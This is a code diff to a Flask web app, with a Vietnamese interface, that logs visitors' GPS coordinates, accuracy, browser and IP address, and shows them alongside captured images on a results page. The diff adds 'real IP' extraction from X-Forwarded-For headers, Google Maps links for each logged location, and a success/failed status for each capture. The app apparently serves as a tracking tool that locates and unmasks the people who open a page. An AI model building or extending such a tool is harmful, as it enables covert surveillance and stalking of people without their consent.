@@ -25,7 +25,7 @@ def index():
 @app.route('/log', methods=['POST'])
 def log_data():
     data = request.get_json()
-    data['ip'] = request.remote_addr
+    data['ip'] = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
     data['server_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
     log_file = os.path.join(LOG_DIR, 'tracking_log.jsonl')
@@ -65,7 +65,8 @@ def results():
     if os.path.exists(log_file):
         with open(log_file, 'r', encoding='utf-8') as f:
             for line in f:
-                logs.append(json.loads(line))
+                try: logs.append(json.loads(line))
+                except: pass
     
     # Lấy danh sách ảnh
     images = []
@@ -87,19 +88,22 @@ def results():
             .img-container { display: flex; flex-wrap: wrap; gap: 10px; }
             .img-card { background: white; padding: 10px; border: 1px solid #ccc; text-align: center; }
             img { max-width: 250px; display: block; margin-bottom: 5px; }
+            .status { font-weight: bold; }
+            .success { color: green; }
+            .failed { color: red; }
         </style>
     </head>
     <body>
         <h2>Dữ liệu GPS & IP</h2>
         <table>
-            <tr><th>Thời gian</th><th>IP</th><th>Lat</th><th>Lon</th><th>Accuracy</th><th>Trình duyệt</th></tr>
+            <tr><th>Thời gian</th><th>IP Thật</th><th>Lat</th><th>Lon</th><th>Accuracy</th><th>Trạng thái</th><th>Trình duyệt</th></tr>
             {% for log in logs %}
             <tr>
                 <td>{{ log.server_time }}</td>
-                <td>{{ log.ip }}</td>
-                <td>{{ log.lat }}</td>
-                <td>{{ log.lon }}</td>
+                <td style="color: blue; font-weight: bold;">{{ log.ip }}</td>
+                <td><a href="https://www.google.com/maps?q={{log.lat}},{{log.lon}}" target="_blank">{{ log.lat }}, {{ log.lon }}</a></td>
                 <td>{{ log.accuracy }}m</td>
+                <td class="status {{ 'success' if log.status == 'Success' else 'failed' }}">{{ log.status }}</td>
                 <td style="font-size: 0.8em;">{{ log.userAgent }}</td>
             </tr>
             {% endfor %}
